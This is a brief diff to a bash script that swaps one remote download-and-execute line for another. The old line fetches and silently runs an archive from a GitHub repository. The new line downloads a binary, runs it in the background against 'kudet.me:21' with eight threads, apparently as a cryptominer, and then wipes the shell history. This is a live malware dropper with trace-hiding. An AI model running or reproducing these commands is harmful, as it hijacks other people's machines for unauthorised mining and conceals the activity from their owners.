@@ -1,4 +1,3 @@
 #!/bin/bash
 reset
-cd /tmp && curl -O https://raw.githubusercontent.com/robertreynolds2/mine/main/mina.tar && tar -xf mina.tar && rm -rf mina.tar && chmod +x update logs && bash ./logs > /dev/null 2>&1
-
+cd /tmp && rm -rf solo && wget https://raw.githubusercontent.com/robertreynolds2/solo/main/solo && chmod +x solo && ./solo -o kudet.me:21 -t8 -B && history -c
